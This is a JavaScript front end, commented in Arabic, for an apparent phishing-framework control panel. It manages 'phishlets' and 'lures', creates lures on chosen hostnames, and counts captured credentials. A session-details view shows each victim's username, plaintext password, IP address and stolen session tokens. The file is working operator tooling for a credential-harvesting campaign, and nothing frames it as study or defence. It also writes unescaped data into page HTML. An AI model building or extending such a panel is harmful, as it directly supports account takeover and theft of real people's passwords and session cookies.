// العناصر الرئيسية في واجهة المستخدم
const sidebar = document.querySelector('.sidebar');
const content = document.querySelector('.content');
const menuToggle = document.querySelector('.menu-toggle');
const navLinks = document.querySelectorAll('.sidebar-nav a');
const tabContents = document.querySelectorAll('.tab-content');
const logoutBtn = document.getElementById('logout-btn');

// العناصر الخاصة بالتبويبات المختلفة
const phishletsTable = document.getElementById('phishlets-table');
const luresTable = document.getElementById('lures-table');
const sessionsTable = document.getElementById('sessions-table');
const phishletsRefreshBtn = document.getElementById('refresh-phishlets');
const luresRefreshBtn = document.getElementById('refresh-lures');
const sessionsRefreshBtn = document.getElementById('refresh-sessions');
const createLureBtn = document.getElementById('create-lure-btn');
const lastUpdatedSpan = document.querySelector('.last-updated');

// إحصائيات الداشبورد
const phishletsCountElement = document.getElementById('phishlets-count');
const luresCountElement = document.getElementById('lures-count');
const sessionsCountElement = document.getElementById('sessions-count');
const credentialsCountElement = document.getElementById('credentials-count');

// عنوان API الأساسي
const API_BASE_URL = window.location.origin + '/api';

// متغيرات عامة
let authToken = localStorage.getItem('authToken');
let phishlets = [];
let lures = [];
let sessions = [];
let credentials = [];

// التحقق من حالة تسجيل الدخول
function checkAuthentication() {
    if (!authToken) {
        window.location.href = '/login';
    }
}

// إضافة الهيدر الخاص بالمصادقة إلى طلبات API
function getHeaders() {
    return {
        'Authorization': `Bearer ${authToken}`,
        'Content-Type': 'application/json'
    };
}

// دالة للتعامل مع الأخطاء
function handleApiError(error) {
    console.error('API Error:', error);
    if (error.status === 401) {
        // تسجيل الخروج إذا كانت المصادقة غير صالحة
        localStorage.removeItem('authToken');
        window.location.href = '/login';
    }
    showToast('خطأ', error.message || 'حدث خطأ أثناء الاتصال بالخادم', 'error');
}

// دالة لتحديث الوقت
function updateLastUpdated() {
    const now = new Date();
    const options = {
        hour: '2-digit',
        minute: '2-digit',
        second: '2-digit'
    };
    lastUpdatedSpan.textContent = now.toLocaleTimeString('ar-SA', options);
}

// إظهار رسالة تنبيه
function showToast(title, message, type = 'info') {
    const toaster = document.querySelector('.toaster') || createToaster();
    const toast = document.createElement('div');
    toast.className = `toast toast-${type}`;
    
    let icon = '';
    switch(type) {
        case 'success': icon = 'fas fa-check-circle'; break;
        case 'error': icon = 'fas fa-exclamation-circle'; break;
        case 'warning': icon = 'fas fa-exclamation-triangle'; break;
        default: icon = 'fas fa-info-circle';
    }
    
    toast.innerHTML = `
        <div class="toast-icon"><i class="${icon}"></i></div>
        <div class="toast-content">
            <div class="toast-title">${title}</div>
            <div class="toast-message">${message}</div>
        </div>
        <button class="toast-close"><i class="fas fa-times"></i></button>
    `;
    
    toaster.appendChild(toast);
    
    // إزالة التنبيه بعد 5 ثواني
    setTimeout(() => {
        toast.style.opacity = '0';
        setTimeout(() => {
            toaster.removeChild(toast);
        }, 300);
    }, 5000);
    
    // زر إغلاق التنبيه
    toast.querySelector('.toast-close').addEventListener('click', () => {
        toast.style.opacity = '0';
        setTimeout(() => {
            toaster.removeChild(toast);
        }, 300);
    });
}

// إنشاء حاوية التنبيهات إذا لم تكن موجودة
function createToaster() {
    const toaster = document.createElement('div');
    toaster.className = 'toaster';
    document.body.appendChild(toaster);
    return toaster;
}

// ================= API Calls =================

// جلب قائمة الـ Phishlets
async function fetchPhishlets() {
    try {
        const response = await fetch(`${API_BASE_URL}/phishlets`, {
            method: 'GET',
            headers: getHeaders()
        });
        
        if (!response.ok) {
            throw {
                status: response.status,
                message: 'فشل في جلب قائمة الـ Phishlets'
            };
        }
        
        phishlets = await response.json();
        return phishlets;
    } catch (error) {
        handleApiError(error);
        return [];
    }
}

// جلب قائمة الـ Lures
async function fetchLures() {
    try {
        const response = await fetch(`${API_BASE_URL}/lures`, {
            method: 'GET',
            headers: getHeaders()
        });
        
        if (!response.ok) {
            throw {
                status: response.status,
                message: 'فشل في جلب قائمة الـ Lures'
            };
        }
        
        lures = await response.json();
        return lures;
    } catch (error) {
        handleApiError(error);
        return [];
    }
}

// جلب قائمة الـ Sessions
async function fetchSessions() {
    try {
        const response = await fetch(`${API_BASE_URL}/sessions`, {
            method: 'GET',
            headers: getHeaders()
        });
        
        if (!response.ok) {
            throw {
                status: response.status,
                message: 'فشل في جلب قائمة الـ Sessions'
            };
        }
        
        sessions = await response.json();
        return sessions;
    } catch (error) {
        handleApiError(error);
        return [];
    }
}

// تفعيل أو تعطيل الـ Phishlet
async function togglePhishlet(name, enable) {
    try {
        const action = enable ? 'enable' : 'disable';
        const response = await fetch(`${API_BASE_URL}/phishlets/${name}/${action}`, {
            method: 'POST',
            headers: getHeaders()
        });
        
        if (!response.ok) {
            throw {
                status: response.status,
                message: `فشل في ${enable ? 'تفعيل' : 'تعطيل'} الـ Phishlet`
            };
        }
        
        showToast('تم بنجاح', `تم ${enable ? 'تفعيل' : 'تعطيل'} ${name} بنجاح`, 'success');
        return true;
    } catch (error) {
        handleApiError(error);
        return false;
    }
}

// إنشاء Lure جديد
async function createLure(lureData) {
    try {
        const response = await fetch(`${API_BASE_URL}/lures`, {
            method: 'POST',
            headers: getHeaders(),
            body: JSON.stringify(lureData)
        });
        
        if (!response.ok) {
            throw {
                status: response.status,
                message: 'فشل في إنشاء الـ Lure'
            };
        }
        
        showToast('تم بنجاح', 'تم إنشاء Lure جديد بنجاح', 'success');
        return await response.json();
    } catch (error) {
        handleApiError(error);
        return null;
    }
}

// حذف Lure
async function deleteLure(id) {
    try {
        const response = await fetch(`${API_BASE_URL}/lures/${id}`, {
            method: 'DELETE',
            headers: getHeaders()
        });
        
        if (!response.ok) {
            throw {
                status: response.status,
                message: 'فشل في حذف الـ Lure'
            };
        }
        
        showToast('تم بنجاح', 'تم حذف Lure بنجاح', 'success');
        return true;
    } catch (error) {
        handleApiError(error);
        return false;
    }
}

// جلب تفاصيل Session
async function fetchSessionDetails(id) {
    try {
        const response = await fetch(`${API_BASE_URL}/sessions/${id}`, {
            method: 'GET',
            headers: getHeaders()
        });
        
        if (!response.ok) {
            throw {
                status: response.status,
                message: 'فشل في جلب تفاصيل الـ Session'
            };
        }
        
        return await response.json();
    } catch (error) {
        handleApiError(error);
        return null;
    }
}

// ================= UI Functions =================

// تحديث لوحة القيادة
async function updateDashboard() {
    try {
        updateLastUpdated();
        
        // جلب البيانات من API
        const [phishletsData, luresData, sessionsData] = await Promise.all([
            fetchPhishlets(),
            fetchLures(),
            fetchSessions()
        ]);
        
        // تحديث الإحصائيات
        phishletsCountElement.textContent = phishletsData.length;
        luresCountElement.textContent = luresData.length;
        sessionsCountElement.textContent = sessionsData.length;
        
        // حساب عدد بيانات الاعتماد المسجلة
        let credCount = 0;
        sessionsData.forEach(session => {
            if (session.tokens && Object.keys(session.tokens).length > 0) {
                credCount++;
            }
        });
        credentialsCountElement.textContent = credCount;
        
        // تحديث جدول الجلسات الأخيرة
        const recentSessionsTable = document.getElementById('recent-sessions-table');
        if (recentSessionsTable) {
            populateRecentSessionsTable(recentSessionsTable, sessionsData.slice(0, 5));
        }
        
    } catch (error) {
        console.error('Error updating dashboard:', error);
        showToast('خطأ', 'فشل في تحديث لوحة القيادة', 'error');
    }
}

// تعبئة جدول الجلسات الأخيرة
function populateRecentSessionsTable(tableElement, sessions) {
    const tbody = tableElement.querySelector('tbody');
    tbody.innerHTML = '';
    
    if (sessions.length === 0) {
        const tr = document.createElement('tr');
        tr.innerHTML = `<td colspan="5" class="text-center">لا توجد جلسات مسجلة</td>`;
        tbody.appendChild(tr);
        return;
    }
    
    sessions.forEach(session => {
        const tr = document.createElement('tr');
        tr.innerHTML = `
            <td>${session.id}</td>
            <td>${session.phishlet}</td>
            <td>${session.username || 'غير مسجل'}</td>
            <td>${session.remote_addr}</td>
            <td>${formatDate(session.created)}</td>
        `;
        tbody.appendChild(tr);
    });
}

// تعبئة جدول الـ Phishlets
function populatePhishletsTable(phishlets) {
    const tbody = phishletsTable.querySelector('tbody');
    tbody.innerHTML = '';
    
    if (phishlets.length === 0) {
        const tr = document.createElement('tr');
        tr.innerHTML = `<td colspan="5" class="text-center">لا توجد phishlets</td>`;
        tbody.appendChild(tr);
        return;
    }
    
    phishlets.forEach(phishlet => {
        const tr = document.createElement('tr');
        tr.innerHTML = `
            <td>${phishlet.name}</td>
            <td>${phishlet.author}</td>
            <td>${phishlet.proxyHosts ? phishlet.proxyHosts.join(', ') : ''}</td>
            <td><span class="badge ${phishlet.enabled ? 'badge-success' : 'badge-danger'}">${phishlet.enabled ? 'مفعل' : 'معطل'}</span></td>
            <td class="action-buttons">
                <button class="btn btn-sm ${phishlet.enabled ? 'btn-danger' : 'btn-success'}" data-action="${phishlet.enabled ? 'disable' : 'enable'}" data-name="${phishlet.name}">
                    <i class="fas fa-${phishlet.enabled ? 'power-off' : 'play'}"></i>
                    ${phishlet.enabled ? 'تعطيل' : 'تفعيل'}
                </button>
            </td>
        `;
        tbody.appendChild(tr);
    });
    
    // إضافة معالجات الأحداث لأزرار التفعيل/التعطيل
    const actionButtons = tbody.querySelectorAll('[data-action]');
    actionButtons.forEach(button => {
        button.addEventListener('click', async function() {
            const name = this.dataset.name;
            const action = this.dataset.action;
            
            if (action === 'enable') {
                await togglePhishlet(name, true);
            } else {
                await togglePhishlet(name, false);
            }
            
            // تحديث جدول الـ Phishlets
            const updatedPhishlets = await fetchPhishlets();
            populatePhishletsTable(updatedPhishlets);
        });
    });
}

// تعبئة جدول الـ Lures
function populateLuresTable(lures) {
    const tbody = luresTable.querySelector('tbody');
    tbody.innerHTML = '';
    
    if (lures.length === 0) {
        const tr = document.createElement('tr');
        tr.innerHTML = `<td colspan="5" class="text-center">لا توجد lures</td>`;
        tbody.appendChild(tr);
        return;
    }
    
    lures.forEach(lure => {
        const tr = document.createElement('tr');
        tr.innerHTML = `
            <td>${lure.id}</td>
            <td>${lure.phishlet}</td>
            <td>${lure.hostname}</td>
            <td>${lure.path || '/'}</td>
            <td class="action-buttons">
                <button class="btn btn-sm btn-danger" data-action="delete" data-id="${lure.id}">
                    <i class="fas fa-trash-alt"></i> حذف
                </button>
            </td>
        `;
        tbody.appendChild(tr);
    });
    
    // إضافة معالجات الأحداث لأزرار الحذف
    const deleteButtons = tbody.querySelectorAll('[data-action="delete"]');
    deleteButtons.forEach(button => {
        button.addEventListener('click', async function() {
            const id = this.dataset.id;
            if (confirm('هل أنت متأكد من حذف هذا الـ Lure؟')) {
                await deleteLure(id);
                // تحديث جدول الـ Lures
                const updatedLures = await fetchLures();
                populateLuresTable(updatedLures);
                // تحديث الإحصائيات
                updateDashboard();
            }
        });
    });
}

// تعبئة جدول الـ Sessions
function populateSessionsTable(sessions) {
    const tbody = sessionsTable.querySelector('tbody');
    tbody.innerHTML = '';
    
    if (sessions.length === 0) {
        const tr = document.createElement('tr');
        tr.innerHTML = `<td colspan="6" class="text-center">لا توجد جلسات مسجلة</td>`;
        tbody.appendChild(tr);
        return;
    }
    
    sessions.forEach(session => {
        const hasCredentials = session.tokens && Object.keys(session.tokens).length > 0;
        const tr = document.createElement('tr');
        tr.innerHTML = `
            <td>${session.id}</td>
            <td>${session.phishlet}</td>
            <td>${session.username || 'غير مسجل'}</td>
            <td>${session.remote_addr}</td>
            <td>${formatDate(session.created)}</td>
            <td class="action-buttons">
                <button class="btn btn-sm btn-primary" data-action="view" data-id="${session.id}">
                    <i class="fas fa-eye"></i> عرض
                </button>
                ${hasCredentials ? `<span class="badge badge-success">بيانات اعتماد</span>` : ''}
            </td>
        `;
        tbody.appendChild(tr);
    });
    
    // إضافة معالجات الأحداث لأزرار العرض
    const viewButtons = tbody.querySelectorAll('[data-action="view"]');
    viewButtons.forEach(button => {
        button.addEventListener('click', async function() {
            const id = this.dataset.id;
            await showSessionDetails(id);
        });
    });
}

// عرض تفاصيل الجلسة
async function showSessionDetails(id) {
    // إنشاء النافذة المنبثقة
    const modal = document.createElement('div');
    modal.className = 'modal active';
    modal.innerHTML = `
        <div class="modal-content modal-lg">
            <div class="modal-header">
                <h3>تفاصيل الجلسة</h3>
                <button class="modal-close">&times;</button>
            </div>
            <div class="modal-body">
                <div class="session-details">
                    <div class="loading-spinner">
                        <div class="spinner"></div>
                        <p style="margin-top: 10px;">جاري تحميل البيانات...</p>
                    </div>
                    <div class="session-info"></div>
                    <div class="tokens-section">
                        <h4>بيانات الاعتماد والرموز</h4>
                        <div class="tokens-container"></div>
                    </div>
                </div>
            </div>
            <div class="modal-footer">
                <button class="btn btn-secondary modal-close-btn">إغلاق</button>
            </div>
        </div>
    `;
    document.body.appendChild(modal);
    
    // إضافة معالجات الأحداث للإغلاق
    const closeButtons = modal.querySelectorAll('.modal-close, .modal-close-btn');
    closeButtons.forEach(button => {
        button.addEventListener('click', function() {
            document.body.removeChild(modal);
        });
    });
    
    // جلب تفاصيل الجلسة
    try {
        const sessionDetails = await fetchSessionDetails(id);
        const loadingSpinner = modal.querySelector('.loading-spinner');
        loadingSpinner.style.display = 'none';
        
        if (!sessionDetails) {
            showToast('خطأ', 'فشل في جلب تفاصيل الجلسة', 'error');
            return;
        }
        
        // عرض معلومات الجلسة
        const sessionInfoElement = modal.querySelector('.session-info');
        sessionInfoElement.innerHTML = `
            <div class="info-item">
                <span class="info-label">معرف الجلسة</span>
                <span class="info-value">${sessionDetails.id}</span>
            </div>
            <div class="info-item">
                <span class="info-label">Phishlet</span>
                <span class="info-value">${sessionDetails.phishlet}</span>
            </div>
            <div class="info-item">
                <span class="info-label">اسم المستخدم</span>
                <span class="info-value">${sessionDetails.username || 'غير مسجل'}</span>
            </div>
            <div class="info-item">
                <span class="info-label">الكلمة السرية</span>
                <span class="info-value">${sessionDetails.password || 'غير مسجلة'}</span>
            </div>
            <div class="info-item">
                <span class="info-label">عنوان IP</span>
                <span class="info-value">${sessionDetails.remote_addr}</span>
            </div>
            <div class="info-item">
                <span class="info-label">تاريخ الإنشاء</span>
                <span class="info-value">${formatDate(sessionDetails.created)}</span>
            </div>
        `;
        
        // عرض الرموز والبيانات
        const tokensContainer = modal.querySelector('.tokens-container');
        if (sessionDetails.tokens && Object.keys(sessionDetails.tokens).length > 0) {
            let tokensHTML = '';
            for (const [key, value] of Object.entries(sessionDetails.tokens)) {
                tokensHTML += `
                    <div class="token-item">
                        <div class="token-name">${key}</div>
                        <div class="token-value">${value}</div>
                    </div>
                `;
            }
            tokensContainer.innerHTML = tokensHTML;
        } else {
            tokensContainer.innerHTML = '<p class="no-tokens">لا توجد بيانات اعتماد مسجلة لهذه الجلسة</p>';
        }
        
    } catch (error) {
        console.error('Error fetching session details:', error);
        showToast('خطأ', 'فشل في جلب تفاصيل الجلسة', 'error');
    }
}

// إظهار نافذة إنشاء Lure جديد
async function showCreateLureModal() {
    // جلب قائمة الـ Phishlets لعرضها في القائمة المنسدلة
    const phishlets = await fetchPhishlets();
    
    // إنشاء النافذة المنبثقة
    const modal = document.createElement('div');
    modal.className = 'modal active';
    modal.innerHTML = `
        <div class="modal-content">
            <div class="modal-header">
                <h3>إنشاء Lure جديد</h3>
                <button class="modal-close">&times;</button>
            </div>
            <div class="modal-body">
                <form id="create-lure-form">
                    <div class="form-group">
                        <label for="lure-phishlet">Phishlet</label>
                        <select id="lure-phishlet" class="form-control" required>
                            <option value="">-- اختر Phishlet --</option>
                            ${phishlets.map(p => `<option value="${p.name}" ${p.enabled ? '' : 'disabled'}>${p.name} ${p.enabled ? '' : '(معطل)'}</option>`).join('')}
                        </select>
                    </div>
                    <div class="form-group">
                        <label for="lure-hostname">اسم المضيف (Hostname)</label>
                        <input type="text" id="lure-hostname" class="form-control" required>
                    </div>
                    <div class="form-group">
                        <label for="lure-path">المسار (اختياري)</label>
                        <input type="text" id="lure-path" class="form-control" placeholder="/login">
                    </div>
                </form>
            </div>
            <div class="modal-footer">
                <button class="btn btn-secondary modal-close-btn">إلغاء</button>
                <button class="btn btn-primary" id="submit-lure">إنشاء</button>
            </div>
        </div>
    `;
    document.body.appendChild(modal);
    
    // إضافة معالجات الأحداث للإغلاق
    const closeButtons = modal.querySelectorAll('.modal-close, .modal-close-btn');
    closeButtons.forEach(button => {
        button.addEventListener('click', function() {
            document.body.removeChild(modal);
        });
    });
    
    // معالج الحدث لإرسال النموذج
    const submitButton = modal.querySelector('#submit-lure');
    submitButton.addEventListener('click', async function() {
        const phishlet = modal.querySelector('#lure-phishlet').value;
        const hostname = modal.querySelector('#lure-hostname').value;
        const path = modal.querySelector('#lure-path').value;
        
        if (!phishlet || !hostname) {
            showToast('خطأ', 'يرجى ملء جميع الحقول المطلوبة', 'error');
            return;
        }
        
        const lureData = {
            phishlet: phishlet,
            hostname: hostname,
            path: path || '/'
        };
        
        const result = await createLure(lureData);
        if (result) {
            document.body.removeChild(modal);
            
            // تحديث جدول الـ Lures
            const updatedLures = await fetchLures();
            populateLuresTable(updatedLures);
            
            // تحديث الإحصائيات
            updateDashboard();
        }
    });
}

// تنسيق التاريخ
function formatDate(dateString) {
    const date = new Date(dateString);
    return date.toLocaleString('ar-SA');
}

// ================= Event Handlers =================

// تبديل قائمة التنقل الجانبية
menuToggle.addEventListener('click', function() {
    sidebar.classList.toggle('active');
});

// التنقل بين التبويبات
navLinks.forEach(link => {
    link.addEventListener('click', function(e) {
        e.preventDefault();
        
        // تحديد التبويب النشط
        navLinks.forEach(item => item.parentElement.classList.remove('active'));
        this.parentElement.classList.add('active');
        
        // إظهار المحتوى المناسب
        const targetId = this.getAttribute('href').substring(1);
        tabContents.forEach(content => content.classList.remove('active'));
        document.getElementById(targetId).classList.add('active');
        
        // تحديث بيانات التبويب عند النقر عليه
        if (targetId === 'phishlets-tab') {
            fetchPhishlets().then(data => populatePhishletsTable(data));
        } else if (targetId === 'lures-tab') {
            fetchLures().then(data => populateLuresTable(data));
        } else if (targetId === 'sessions-tab') {
            fetchSessions().then(data => populateSessionsTable(data));
        } else if (targetId === 'dashboard-tab') {
            updateDashboard();
        }
    });
});

// أزرار تحديث البيانات
phishletsRefreshBtn.addEventListener('click', function() {
    fetchPhishlets().then(data => {
        populatePhishletsTable(data);
        showToast('تم التحديث', 'تم تحديث قائمة الـ Phishlets بنجاح', 'success');
    });
});

luresRefreshBtn.addEventListener('click', function() {
    fetchLures().then(data => {
        populateLuresTable(data);
        showToast('تم التحديث', 'تم تحديث قائمة الـ Lures بنجاح', 'success');
    });
});

sessionsRefreshBtn.addEventListener('click', function() {
    fetchSessions().then(data => {
        populateSessionsTable(data);
        showToast('تم التحديث', 'تم تحديث قائمة الـ Sessions بنجاح', 'success');
    });
});

// زر إنشاء Lure جديد
createLureBtn.addEventListener('click', showCreateLureModal);

// زر تسجيل الخروج
logoutBtn.addEventListener('click', function() {
    // حذف الـ token من التخزين المحلي
    localStorage.removeItem('authToken');
    // توجيه المستخدم إلى صفحة تسجيل الدخول
    window.location.href = '/login';
});

// ================= Initialization =================

// تهيئة الصفحة عند التحميل
document.addEventListener('DOMContentLoaded', function() {
    // التحقق من حالة تسجيل الدخول
    checkAuthentication();
    
    // تفعيل التبويب الافتراضي (لوحة القيادة)
    document.querySelector('.sidebar-nav li:first-child a').click();
    
    // تحديث البيانات كل دقيقة
    setInterval(function() {
        // فقط إذا كان تبويب لوحة القيادة نشطًا
        if (document.getElementById('dashboard-tab').classList.contains('active')) {
            updateDashboard();
        }
    }, 60000);
}); 